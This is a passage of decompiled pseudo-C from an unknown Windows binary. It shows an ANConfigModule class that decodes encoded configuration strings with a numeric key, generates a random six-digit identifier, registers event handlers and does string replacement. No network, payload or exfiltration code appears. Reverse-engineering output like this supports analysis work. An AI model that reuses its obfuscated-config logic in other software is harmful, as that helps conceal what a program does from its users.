  unsigned int v44; // [esp+24h] [ebp-120h]
  void *v45[5]; // [esp+28h] [ebp-11Ch] BYREF
  unsigned int v46; // [esp+3Ch] [ebp-108h]
  void *v47[5]; // [esp+40h] [ebp-104h] BYREF
  unsigned int v48; // [esp+54h] [ebp-F0h]
  void *v49[5]; // [esp+58h] [ebp-ECh] BYREF
  unsigned int v50; // [esp+6Ch] [ebp-D8h]
  void *v51[5]; // [esp+70h] [ebp-D4h] BYREF
  unsigned int v52; // [esp+84h] [ebp-C0h]
  void *v53[5]; // [esp+88h] [ebp-BCh] BYREF
  unsigned int v54; // [esp+9Ch] [ebp-A8h]
  void *v55[5]; // [esp+A0h] [ebp-A4h] BYREF
  unsigned int v56; // [esp+B4h] [ebp-90h]
  void *v57[5]; // [esp+B8h] [ebp-8Ch] BYREF
  unsigned int v58; // [esp+CCh] [ebp-78h]
  void *v59[5]; // [esp+D0h] [ebp-74h] BYREF
  unsigned int v60; // [esp+E4h] [ebp-60h]
  void *v61[5]; // [esp+E8h] [ebp-5Ch] BYREF
  unsigned int v62; // [esp+FCh] [ebp-48h]
  void *v63[5]; // [esp+100h] [ebp-44h] BYREF
  unsigned int v64; // [esp+114h] [ebp-30h]
  void *Block[5]; // [esp+118h] [ebp-2Ch] BYREF
  unsigned int v66; // [esp+12Ch] [ebp-18h]
  int *v67; // [esp+130h] [ebp-14h]
  int *v68; // [esp+134h] [ebp-10h]
  int v69; // [esp+140h] [ebp-4h]

  v68 = this;
  v67 = this;
  v69 = 0;
  if ( a3 )
    _InterlockedIncrement(a3 + 1);
  sub_40F700(this, a2, a3, 2);
  LOBYTE(v69) = 1;
  *this = (int)&ANConfigModule::`vftable';
  this[6] = 18479;
  this[7] = 5;
  v4 = this[6];
  v5 = this[7];
  v6 = (_DWORD *)sub_4104B0((int)v63, (int)&unk_49E678, v5);
  LOBYTE(v69) = 2;
  v7 = (const CHAR *)sub_410770((int)Block, v6, v5, v4);
  LOBYTE(v69) = 3;
  sub_405DB0(this + 8, v7);
  LOBYTE(v69) = 5;
  if ( v66 >= 0x10 )
  {
    v8 = Block[0];
    if ( v66 + 1 >= 0x1000 )
    {
      v8 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v8 - 4) > 0x1F )
        goto LABEL_56;
    }
    sub_44775B(v8);
  }
  Block[4] = 0;
  v66 = 15;
  LOBYTE(Block[0]) = 0;
  LOBYTE(v69) = 6;
  if ( v64 < 0x10 )
    goto LABEL_11;
  v9 = v63[0];
  if ( v64 + 1 >= 0x1000 )
  {
    v9 = (void *)*((_DWORD *)v63[0] - 1);
    if ( (unsigned int)(v63[0] - v9 - 4) > 0x1F )
LABEL_56:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v9);
LABEL_11:
  v63[4] = 0;
  v64 = 15;
  LOBYTE(v63[0]) = 0;
  this[14] = 368;
  this[15] = 54;
  this[16] = 14;
  this[17] = 286;
  this[18] = 351;
  this[19] = 16000;
  this[20] = 16000;
  this[21] = 16000;
  this[22] = 1175;
  this[23] = 64;
  v10 = this[6];
  v11 = this[14];
  v12 = (_DWORD *)sub_4104B0((int)v61, (int)&unk_49E6A0, v11);
  LOBYTE(v69) = 7;
  sub_410770((int)(this + 24), v12, v11, v10);
  LOBYTE(v69) = 9;
  if ( v62 >= 0x10 )
  {
    v13 = v61[0];
    if ( v62 + 1 >= 0x1000 )
    {
      v13 = (void *)*((_DWORD *)v61[0] - 1);
      if ( (unsigned int)(v61[0] - v13 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v13);
  }
  v14 = this[6];
  v15 = this[15];
  v61[4] = 0;
  v62 = 15;
  LOBYTE(v61[0]) = 0;
  v16 = (_DWORD *)sub_4104B0((int)v57, (int)&unk_49E818, v15);
  LOBYTE(v69) = 10;
  v17 = (int *)sub_410770((int)v59, v16, v15, v14);
  LOBYTE(v69) = 11;
  sub_4105C0(this + 30, v17);
  LOBYTE(v69) = 13;
  if ( v60 >= 0x10 )
  {
    v18 = v59[0];
    if ( v60 + 1 >= 0x1000 )
    {
      v18 = (void *)*((_DWORD *)v59[0] - 1);
      if ( (unsigned int)(v59[0] - v18 - 4) > 0x1F )
        goto LABEL_58;
    }
    sub_44775B(v18);
  }
  v59[4] = 0;
  v60 = 15;
  LOBYTE(v59[0]) = 0;
  LOBYTE(v69) = 14;
  if ( v58 < 0x10 )
    goto LABEL_23;
  v19 = v57[0];
  if ( v58 + 1 >= 0x1000 )
  {
    v19 = (void *)*((_DWORD *)v57[0] - 1);
    if ( (unsigned int)(v57[0] - v19 - 4) > 0x1F )
LABEL_58:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v19);
LABEL_23:
  v20 = this[6];
  v21 = this[16];
  v57[4] = 0;
  v58 = 15;
  LOBYTE(v57[0]) = 0;
  v22 = (_DWORD *)sub_4104B0((int)v53, (int)&unk_49F020, v21);
  LOBYTE(v69) = 15;
  v23 = (int *)sub_410770((int)v55, v22, v21, v20);
  LOBYTE(v69) = 16;
  sub_4105C0(this + 33, v23);
  LOBYTE(v69) = 18;
  if ( v56 >= 0x10 )
  {
    v24 = v55[0];
    if ( v56 + 1 >= 0x1000 )
    {
      v24 = (void *)*((_DWORD *)v55[0] - 1);
      if ( (unsigned int)(v55[0] - v24 - 4) > 0x1F )
        goto LABEL_59;
    }
    sub_44775B(v24);
  }
  v55[4] = 0;
  v56 = 15;
  LOBYTE(v55[0]) = 0;
  LOBYTE(v69) = 19;
  if ( v54 < 0x10 )
    goto LABEL_31;
  v25 = v53[0];
  if ( v54 + 1 >= 0x1000 )
  {
    v25 = (void *)*((_DWORD *)v53[0] - 1);
    if ( (unsigned int)(v53[0] - v25 - 4) > 0x1F )
LABEL_59:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v25);
LABEL_31:
  v26 = this[6];
  v27 = this[17];
  v53[4] = 0;
  v54 = 15;
  LOBYTE(v53[0]) = 0;
  v28 = (_DWORD *)sub_4104B0((int)v49, (int)&unk_49F828, v27);
  LOBYTE(v69) = 20;
  v29 = (int *)sub_410770((int)v51, v28, v27, v26);
  LOBYTE(v69) = 21;
  sub_4105C0(this + 36, v29);
  LOBYTE(v69) = 23;
  if ( v52 >= 0x10 )
  {
    v30 = v51[0];
    if ( v52 + 1 >= 0x1000 )
    {
      v30 = (void *)*((_DWORD *)v51[0] - 1);
      if ( (unsigned int)(v51[0] - v30 - 4) > 0x1F )
        goto LABEL_60;
    }
    sub_44775B(v30);
  }
  v51[4] = 0;
  v52 = 15;
  LOBYTE(v51[0]) = 0;
  LOBYTE(v69) = 24;
  if ( v50 < 0x10 )
    goto LABEL_39;
  v31 = v49[0];
  if ( v50 + 1 >= 0x1000 )
  {
    v31 = (void *)*((_DWORD *)v49[0] - 1);
    if ( (unsigned int)(v49[0] - v31 - 4) > 0x1F )
LABEL_60:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v31);
LABEL_39:
  v32 = this[6];
  v33 = this[18];
  v49[4] = 0;
  v50 = 15;
  LOBYTE(v49[0]) = 0;
  v34 = (_DWORD *)sub_4104B0((int)v45, (int)&unk_4A0030, v33);
  LOBYTE(v69) = 25;
  v35 = (int *)sub_410770((int)v47, v34, v33, v32);
  LOBYTE(v69) = 26;
  sub_4105C0(this + 39, v35);
  LOBYTE(v69) = 28;
  if ( v48 >= 0x10 )
  {
    v36 = v47[0];
    if ( v48 + 1 >= 0x1000 )
    {
      v36 = (void *)*((_DWORD *)v47[0] - 1);
      if ( (unsigned int)(v47[0] - v36 - 4) > 0x1F )
        goto LABEL_61;
    }
    sub_44775B(v36);
  }
  v47[4] = 0;
  v48 = 15;
  LOBYTE(v47[0]) = 0;
  LOBYTE(v69) = 29;
  if ( v46 < 0x10 )
    goto LABEL_47;
  v37 = v45[0];
  if ( v46 + 1 >= 0x1000 )
  {
    v37 = (void *)*((_DWORD *)v45[0] - 1);
    if ( (unsigned int)(v45[0] - v37 - 4) > 0x1F )
LABEL_61:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v37);
LABEL_47:
  v38 = this[6];
  v39 = this[23];
  v45[4] = 0;
  v46 = 15;
  LOBYTE(v45[0]) = 0;
  v40 = (_DWORD *)sub_4104B0((int)v43, (int)&unk_4A0838, v39);
  LOBYTE(v69) = 30;
  sub_410770((int)(this + 42), v40, v39, v38);
  LOBYTE(v69) = 32;
  if ( v44 >= 0x10 )
  {
    v41 = v43[0];
    if ( v44 + 1 >= 0x1000 )
    {
      v41 = (void *)*((_DWORD *)v43[0] - 1);
      if ( (unsigned int)(v43[0] - v41 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v41);
  }
  v43[4] = 0;
  v44 = 15;
  LOBYTE(v43[0]) = 0;
  this[48] = 10;
  this[49] = 47;
  this[50] = -22167825;
  sub_4119A0((int)(this + 51));
  LOBYTE(v69) = 33;
  sub_411580(this, (int)(this + 57));
  LOBYTE(v69) = 34;
  sub_411330(this);
  if ( a3 )
  {
    if ( !_InterlockedExchangeAdd(a3 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))a3)(a3);
      if ( !_InterlockedDecrement(a3 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*a3 + 4))(a3);
    }
  }
  return this;
}
// 4B1510: using guessed type void *ANConfigModule::`vftable';

//----- (00410F50) --------------------------------------------------------
_DWORD *__thiscall sub_410F50(_DWORD *Block, char a2)
{
  sub_410F80(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00410F80) --------------------------------------------------------
void __thiscall sub_410F80(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  unsigned int v4; // ecx
  _DWORD *v5; // eax
  unsigned int v6; // ecx
  _DWORD *v7; // eax
  int v8; // ecx
  _DWORD *v9; // edi
  int v10; // ecx
  _DWORD *v11; // edi
  int v12; // ecx
  _DWORD *v13; // edi
  int v14; // ecx
  _DWORD *v15; // edi
  unsigned int v16; // ecx
  _DWORD *v17; // eax
  unsigned int v18; // ecx
  void *v19; // eax

  *this = &ANConfigModule::`vftable';
  v2 = this[62];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)this[57];
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        goto LABEL_47;
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  this[61] = 0;
  this[62] = 15;
  *((_BYTE *)this + 228) = 0;
  v4 = this[56];
  if ( v4 >= 8 )
  {
    v5 = (_DWORD *)this[51];
    if ( 2 * v4 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
        goto LABEL_47;
      v5 = (_DWORD *)*(v5 - 1);
    }
    sub_44775B(v5);
  }
  this[55] = 0;
  this[56] = 7;
  *((_WORD *)this + 102) = 0;
  v6 = this[47];
  if ( v6 >= 0x10 )
  {
    v7 = (_DWORD *)this[42];
    if ( v6 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v7 - *(v7 - 1) - 4 > 0x1F )
        goto LABEL_47;
      v7 = (_DWORD *)*(v7 - 1);
    }
    sub_44775B(v7);
  }
  this[46] = 0;
  this[47] = 15;
  *((_BYTE *)this + 168) = 0;
  v8 = this[39];
  if ( v8 )
  {
    sub_4047B0(v8, this[40]);
    v9 = (_DWORD *)this[39];
    if ( (unsigned int)(24 * ((this[41] - (int)v9) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v9 - *(v9 - 1) - 4 > 0x1F )
        goto LABEL_47;
      v9 = (_DWORD *)*(v9 - 1);
    }
    sub_44775B(v9);
    this[39] = 0;
    this[40] = 0;
    this[41] = 0;
  }
  v10 = this[36];
  if ( v10 )
  {
    sub_4047B0(v10, this[37]);
    v11 = (_DWORD *)this[36];
    if ( (unsigned int)(24 * ((this[38] - (int)v11) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v11 - *(v11 - 1) - 4 > 0x1F )
        goto LABEL_47;
      v11 = (_DWORD *)*(v11 - 1);
    }
    sub_44775B(v11);
    this[36] = 0;
    this[37] = 0;
    this[38] = 0;
  }
  v12 = this[33];
  if ( v12 )
  {
    sub_4047B0(v12, this[34]);
    v13 = (_DWORD *)this[33];
    if ( (unsigned int)(24 * ((this[35] - (int)v13) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v13 - *(v13 - 1) - 4 > 0x1F )
        goto LABEL_47;
      v13 = (_DWORD *)*(v13 - 1);
    }
    sub_44775B(v13);
    this[33] = 0;
    this[34] = 0;
    this[35] = 0;
  }
  v14 = this[30];
  if ( v14 )
  {
    sub_4047B0(v14, this[31]);
    v15 = (_DWORD *)this[30];
    if ( (unsigned int)(24 * ((this[32] - (int)v15) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v15 - *(v15 - 1) - 4 > 0x1F )
        goto LABEL_47;
      v15 = (_DWORD *)*(v15 - 1);
    }
    sub_44775B(v15);
    this[30] = 0;
    this[31] = 0;
    this[32] = 0;
  }
  v16 = this[29];
  if ( v16 >= 0x10 )
  {
    v17 = (_DWORD *)this[24];
    if ( v16 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v17 - *(v17 - 1) - 4 > 0x1F )
        goto LABEL_47;
      v17 = (_DWORD *)*(v17 - 1);
    }
    sub_44775B(v17);
  }
  this[28] = 0;
  this[29] = 15;
  *((_BYTE *)this + 96) = 0;
  v18 = this[13];
  if ( v18 >= 8 )
  {
    v19 = (void *)this[8];
    if ( 2 * v18 + 2 < 0x1000 )
    {
LABEL_45:
      sub_44775B(v19);
      goto LABEL_46;
    }
    if ( (unsigned int)v19 - *((_DWORD *)v19 - 1) - 4 <= 0x1F )
    {
      v19 = (void *)*((_DWORD *)v19 - 1);
      goto LABEL_45;
    }
LABEL_47:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_46:
  this[12] = 0;
  this[13] = 7;
  *((_WORD *)this + 16) = 0;
  sub_40F840(this);
}
// 4B1510: using guessed type void *ANConfigModule::`vftable';

//----- (00411330) --------------------------------------------------------
int __thiscall sub_411330(int *this)
{
  int result; // eax
  char v3; // [esp+Bh] [ebp-45h]
  int v4[2]; // [esp+Ch] [ebp-44h] BYREF
  int *v5; // [esp+14h] [ebp-3Ch]
  int v6[2]; // [esp+18h] [ebp-38h] BYREF
  char v7; // [esp+20h] [ebp-30h]
  int *v8; // [esp+24h] [ebp-2Ch]
  int *v9; // [esp+3Ch] [ebp-14h]
  int v10; // [esp+4Ch] [ebp-4h]

  v7 = v3;
  v6[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANConfigModule::*)(ANIEvent &&),ANConfigModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  v6[1] = (int)sub_411B30;
  v8 = this;
  v9 = v6;
  v10 = 0;
  sub_40FA20(this, 8, (int)v6);
  v4[0] = (int)sub_411C90;
  v5 = this;
  sub_4123C0(v6, (int)v4);
  sub_40FA20(this, 9, (int)v6);
  v4[0] = (int)sub_411EE0;
  v5 = this;
  sub_4123C0(v6, (int)v4);
  sub_40FA20(this, 10, (int)v6);
  v4[0] = (int)sub_411F10;
  v5 = this;
  sub_4123C0(v6, (int)v4);
  sub_40FA20(this, 11, (int)v6);
  v4[0] = (int)sub_411F40;
  v5 = this;
  sub_4123C0(v6, (int)v4);
  sub_40FA20(this, 12, (int)v6);
  v4[0] = (int)sub_411F70;
  v5 = this;
  sub_4123C0(v6, (int)v4);
  sub_40FA20(this, 13, (int)v6);
  v4[0] = (int)sub_411FB0;
  v5 = this;
  sub_4123C0(v6, (int)v4);
  sub_40FA20(this, 14, (int)v6);
  v4[0] = (int)sub_411FF0;
  v5 = this;
  sub_4123C0(v6, (int)v4);
  sub_40FA20(this, 15, (int)v6);
  v4[0] = (int)sub_412030;
  v5 = this;
  sub_4123C0(v6, (int)v4);
  sub_40FA20(this, 16, (int)v6);
  v4[0] = (int)sub_412050;
  v5 = this;
  sub_4123C0(v6, (int)v4);
  sub_40FA20(this, 17, (int)v6);
  v4[0] = (int)sub_412070;
  v5 = this;
  sub_4123C0(v6, (int)v4);
  sub_40FA20(this, 18, (int)v6);
  v4[0] = (int)sub_4120A0;
  v5 = this;
  sub_4123C0(v6, (int)v4);
  sub_40FA20(this, 36, (int)v6);
  v4[0] = (int)sub_4120E0;
  v5 = this;
  sub_4123C0(v6, (int)v4);
  sub_40FA20(this, 19, (int)v6);
  v4[0] = (int)sub_412120;
  v5 = this;
  sub_4123C0(v6, (int)v4);
  result = sub_40FA20(this, 20, (int)v6);
  if ( v9 )
    return (*(int (__stdcall **)(bool))(*v9 + 16))(v9 != v6);
  return result;
}
// 41135E: variable 'v3' is possibly undefined
// 4B1524: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANConfigModule::*)(ANIEvent &&),ANConfigModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (00411580) --------------------------------------------------------
int __thiscall sub_411580(_DWORD *this, int a2)
{
  int v3; // edi
  int v4; // esi
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  void *v7; // ecx
  void *v8; // ecx
  int v9; // edi
  int v10; // esi
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  void *v13; // ecx
  void *v14; // ecx
  int v15; // edi
  int v16; // esi
  _DWORD *v17; // eax
  _DWORD *v18; // eax
  void *v19; // ecx
  void *v20; // ecx
  int v21; // edi
  int v22; // esi
  _DWORD *v23; // eax
  _DWORD *v24; // eax
  void *v25; // ecx
  void *v26; // ecx
  int result; // eax
  __int128 v28; // xmm0
  void *v29; // [esp+Ch] [ebp-F4h] BYREF
  unsigned int v30; // [esp+20h] [ebp-E0h]
  void *v31[5]; // [esp+24h] [ebp-DCh] BYREF
  unsigned int v32; // [esp+38h] [ebp-C8h]
  void *v33[5]; // [esp+3Ch] [ebp-C4h] BYREF
  unsigned int v34; // [esp+50h] [ebp-B0h]
  void *v35[5]; // [esp+54h] [ebp-ACh] BYREF
  unsigned int v36; // [esp+68h] [ebp-98h]
  void *v37[5]; // [esp+6Ch] [ebp-94h] BYREF
  unsigned int v38; // [esp+80h] [ebp-80h]
  void *v39[5]; // [esp+84h] [ebp-7Ch] BYREF
  unsigned int v40; // [esp+98h] [ebp-68h]
  void *v41[5]; // [esp+9Ch] [ebp-64h] BYREF
  unsigned int v42; // [esp+B0h] [ebp-50h]
  void *Block[5]; // [esp+B4h] [ebp-4Ch] BYREF
  unsigned int v44; // [esp+C8h] [ebp-38h]
  int v45; // [esp+CCh] [ebp-34h]
  int v46; // [esp+D0h] [ebp-30h]
  _DWORD *v47; // [esp+D4h] [ebp-2Ch]
  __int128 Src; // [esp+D8h] [ebp-28h] BYREF
  __int64 v49; // [esp+E8h] [ebp-18h]
  int v50; // [esp+FCh] [ebp-4h]

  v47 = this;
  v46 = a2;
  v45 = a2;
  v49 = 0xF00000000i64;
  LOBYTE(Src) = 0;
  sub_40A390((void **)&Src, (void *)::Src, 0);
  v50 = 0;
  v3 = this[6];
  v4 = this[19];
  v5 = (_DWORD *)sub_4104B0((int)v41, (int)&unk_4A08B8, v47[19]);
  LOBYTE(v50) = 1;
  v6 = (_DWORD *)sub_410770((int)Block, v5, v4, v3);
  LOBYTE(v50) = 2;
  sub_409C70((void **)&Src, v6);
  LOBYTE(v50) = 1;
  if ( v44 >= 0x10 )
  {
    v7 = Block[0];
    if ( v44 + 1 >= 0x1000 )
    {
      v7 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v7 - 4) > 0x1F )
        goto LABEL_34;
    }
    sub_44775B(v7);
  }
  LOBYTE(v50) = 0;
  Block[4] = 0;
  v44 = 15;
  LOBYTE(Block[0]) = 0;
  if ( v42 < 0x10 )
    goto LABEL_9;
  v8 = v41[0];
  if ( v42 + 1 >= 0x1000 )
  {
    v8 = (void *)*((_DWORD *)v41[0] - 1);
    if ( (unsigned int)(v41[0] - v8 - 4) > 0x1F )
LABEL_34:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v8);
LABEL_9:
  v41[4] = 0;
  v42 = 15;
  LOBYTE(v41[0]) = 0;
  v9 = v47[6];
  v10 = v47[20];
  v11 = (_DWORD *)sub_4104B0((int)v37, (int)&unk_4A4740, v10);
  LOBYTE(v50) = 3;
  v12 = (_DWORD *)sub_410770((int)v39, v11, v10, v9);
  LOBYTE(v50) = 4;
  sub_409C70((void **)&Src, v12);
  LOBYTE(v50) = 3;
  if ( v40 >= 0x10 )
  {
    v13 = v39[0];
    if ( v40 + 1 >= 0x1000 )
    {
      v13 = (void *)*((_DWORD *)v39[0] - 1);
      if ( (unsigned int)(v39[0] - v13 - 4) > 0x1F )
        goto LABEL_35;
    }
    sub_44775B(v13);
  }
  LOBYTE(v50) = 0;
  v39[4] = 0;
  v40 = 15;
  LOBYTE(v39[0]) = 0;
  if ( v38 < 0x10 )
    goto LABEL_17;
  v14 = v37[0];
  if ( v38 + 1 >= 0x1000 )
  {
    v14 = (void *)*((_DWORD *)v37[0] - 1);
    if ( (unsigned int)(v37[0] - v14 - 4) > 0x1F )
LABEL_35:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v14);
LABEL_17:
  v37[4] = 0;
  v38 = 15;
  LOBYTE(v37[0]) = 0;
  v15 = v47[6];
  v16 = v47[21];
  v17 = (_DWORD *)sub_4104B0((int)v33, (int)&unk_4A85C8, v16);
  LOBYTE(v50) = 5;
  v18 = (_DWORD *)sub_410770((int)v35, v17, v16, v15);
  LOBYTE(v50) = 6;
  sub_409C70((void **)&Src, v18);
  LOBYTE(v50) = 5;
  if ( v36 >= 0x10 )
  {
    v19 = v35[0];
    if ( v36 + 1 >= 0x1000 )
    {
      v19 = (void *)*((_DWORD *)v35[0] - 1);
      if ( (unsigned int)(v35[0] - v19 - 4) > 0x1F )
        goto LABEL_36;
    }
    sub_44775B(v19);
  }
  LOBYTE(v50) = 0;
  v35[4] = 0;
  v36 = 15;
  LOBYTE(v35[0]) = 0;
  if ( v34 < 0x10 )
    goto LABEL_25;
  v20 = v33[0];
  if ( v34 + 1 >= 0x1000 )
  {
    v20 = (void *)*((_DWORD *)v33[0] - 1);
    if ( (unsigned int)(v33[0] - v20 - 4) > 0x1F )
LABEL_36:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v20);
LABEL_25:
  v33[4] = 0;
  v34 = 15;
  LOBYTE(v33[0]) = 0;
  v21 = v47[6];
  v22 = v47[22];
  v23 = (_DWORD *)sub_4104B0((int)&v29, (int)&unk_4AC450, v22);
  LOBYTE(v50) = 7;
  v24 = (_DWORD *)sub_410770((int)v31, v23, v22, v21);
  LOBYTE(v50) = 8;
  sub_409C70((void **)&Src, v24);
  if ( v32 >= 0x10 )
  {
    v25 = v31[0];
    if ( v32 + 1 >= 0x1000 )
    {
      v25 = (void *)*((_DWORD *)v31[0] - 1);
      if ( (unsigned int)(v31[0] - v25 - 4) > 0x1F )
        goto LABEL_37;
    }
    sub_44775B(v25);
  }
  v31[4] = 0;
  v32 = 15;
  LOBYTE(v31[0]) = 0;
  if ( v30 >= 0x10 )
  {
    v26 = v29;
    if ( v30 + 1 < 0x1000
      || (v26 = (void *)*((_DWORD *)v29 - 1), (unsigned int)((_BYTE *)v29 - (_BYTE *)v26 - 4) <= 0x1F) )
    {
      sub_44775B(v26);
      goto LABEL_33;
    }
LABEL_37:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_33:
  result = v46;
  v28 = Src;
  *(_DWORD *)(v46 + 16) = 0;
  *(_DWORD *)(result + 20) = 0;
  *(_OWORD *)result = v28;
  *(_QWORD *)(result + 16) = v49;
  return result;
}

//----- (004119A0) --------------------------------------------------------
int __stdcall sub_4119A0(int a1)
{
  unsigned int v1; // eax
  int i; // esi
  int v3; // eax
  _DWORD *v4; // eax
  unsigned int v5; // ecx
  void *v6; // ecx
  _DWORD *v7; // eax
  unsigned int v8; // ecx
  void *v9; // ecx
  __int128 v10; // xmm0
  int result; // eax
  void *Block[5]; // [esp+Ch] [ebp-44h] BYREF
  unsigned int v13; // [esp+20h] [ebp-30h]
  int v14; // [esp+24h] [ebp-2Ch]
  __int128 Src; // [esp+28h] [ebp-28h] BYREF
  __int64 v16; // [esp+38h] [ebp-18h]
  int v17; // [esp+4Ch] [ebp-4h]
  int savedregs; // [esp+50h] [ebp+0h] BYREF

  v14 = a1;
  v1 = sub_462E7B(0);
  srand(v1);
  v16 = 0x700000000i64;
  LOWORD(Src) = 0;
  sub_404330(&Src, (void *)&psz, 0);
  v17 = 0;
  for ( i = 0; i < 6; ++i )
  {
    v3 = rand();
    v4 = (_DWORD *)sub_406040((int)Block, v3 % 9);
    LOBYTE(v17) = 1;
    v5 = v4[4];
    if ( v4[5] >= 8u )
      v4 = (_DWORD *)*v4;
    sub_4044A0(&Src, v4, v5);
    LOBYTE(v17) = 0;
    if ( v13 >= 8 )
    {
      v6 = Block[0];
      if ( 2 * v13 + 2 >= 0x1000 )
      {
        v6 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v6 - 4) > 0x1F )
          goto LABEL_16;
      }
      sub_44775B(v6);
    }
  }
  v7 = (_DWORD *)sub_40C780(&dword_4F9478, (int)Block, (int)&savedregs);
  LOBYTE(v17) = 2;
  v8 = v7[4];
  if ( v7[5] >= 8u )
    v7 = (_DWORD *)*v7;
  sub_4044A0(&Src, v7, v8);
  if ( v13 >= 8 )
  {
    v9 = Block[0];
    if ( 2 * v13 + 2 >= 0x1000 )
    {
      v9 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v9 - 4) > 0x1F )
LABEL_16:
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v9);
  }
  v10 = Src;
  *(_DWORD *)(a1 + 16) = 0;
  result = a1;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = v10;
  *(_QWORD *)(a1 + 16) = v16;
  return result;
}

//----- (00411B30) --------------------------------------------------------
_DWORD *__thiscall sub_411B30(int *this, void *a2)
{
  _DWORD *result; // eax
  int *v4; // edx
  unsigned int v5; // ecx
  char *v6; // ebx
  int v7; // esi
  unsigned int v8; // edi
  char *v9; // eax
  _DWORD *v10; // edi
  _DWORD *v11; // edx
  char *v12; // esi
  unsigned int v13; // ecx
  bool v14; // cf
  unsigned __int8 v15; // al
  unsigned __int8 v16; // al
  unsigned __int8 v17; // al
  char *v18; // eax
  _DWORD *Src; // [esp+4h] [ebp-14h]
  _DWORD *v20; // [esp+8h] [ebp-10h]
  int Val; // [esp+Ch] [ebp-Ch]
  char *v22; // [esp+10h] [ebp-8h]
  unsigned int v23; // [esp+14h] [ebp-4h]
  int v24; // [esp+20h] [ebp+8h]

  result = (_DWORD *)sub_412420(a2);
  v20 = result;
  if ( this[61] && result[8] && result[14] )
  {
    v4 = this + 57;
    v5 = result[8];
    v6 = (char *)(result + 4);
    Src = this + 57;
    v23 = v5;
    if ( result[9] >= 0x10u )
      v6 = *(char **)v6;
    v14 = (unsigned int)this[62] < 0x10;
    v7 = (int)(this + 57);
    result = (_DWORD *)v4[4];
    v24 = (int)v4;
    if ( !v14 )
    {
      v7 = *v4;
      v24 = *v4;
    }
    if ( v5 <= (unsigned int)result )
    {
      if ( !v5 )
      {
        v8 = 0;
        goto LABEL_29;
      }
      v9 = (char *)result - v5;
      Val = *v6;
      v22 = &v9[v7 + 1];
      result = memchr((const void *)v7, Val, (size_t)(v9 + 1));
      v10 = result;
      while ( result )
      {
        v11 = v10;
        v12 = v6;
        v13 = v23 - 4;
        if ( v23 < 4 )
        {
LABEL_15:
          if ( v13 == -4 )
            goto LABEL_24;
        }
        else
        {
          while ( *v11 == *(_DWORD *)v12 )
          {
            ++v11;
            v12 += 4;
            v14 = v13 < 4;
            v13 -= 4;
            if ( v14 )
              goto LABEL_15;
          }
        }
        v14 = *(_BYTE *)v11 < (unsigned __int8)*v12;
        if ( *(_BYTE *)v11 != *v12
          || v13 != -3
          && ((v15 = *((_BYTE *)v11 + 1), v14 = v15 < (unsigned __int8)v12[1], v15 != v12[1])
           || v13 != -2
           && ((v16 = *((_BYTE *)v11 + 2), v14 = v16 < (unsigned __int8)v12[2], v16 != v12[2])
            || v13 != -1 && (v17 = *((_BYTE *)v11 + 3), v14 = v17 < (unsigned __int8)v12[3], v17 != v12[3]))) )
        {
          result = (_DWORD *)(v14 ? -1 : 1);
          goto LABEL_25;
        }
LABEL_24:
        result = 0;
LABEL_25:
        if ( !result )
        {
          v8 = (unsigned int)v10 - v24;
          if ( v8 != -1 )
          {
LABEL_29:
            v18 = (char *)(v20 + 10);
            if ( v20[15] >= 0x10u )
              v18 = *(char **)v18;
            result = sub_412250(Src, v8, v20[8], v18, v20[14]);
            *((_BYTE *)v20 + 64) = 1;
          }
          return result;
        }
        result = memchr((char *)v10 + 1, Val, v22 - ((char *)v10 + 1));
        v10 = result;
      }
    }
  }
  return result;
}

//----- (00411C90) --------------------------------------------------------
void __thiscall sub_411C90(unsigned int *this, void *a2)
{
  int v2; // eax
  unsigned __int16 *v3; // esi
  unsigned int v4; // edi
  unsigned __int16 *v5; // ecx
  int v6; // eax
  unsigned int v7; // eax
  __int128 v8; // xmm0
  __int64 v9; // xmm1_8
  _DWORD *v10; // esi
  _DWORD *v11; // edi
  unsigned int v12; // eax
  void **v13; // eax
  const WCHAR *v14; // eax
  HANDLE FileW; // edi
  bool v16; // cf
  DWORD v17; // eax
  WCHAR *v18; // ecx
  void *v19; // ecx
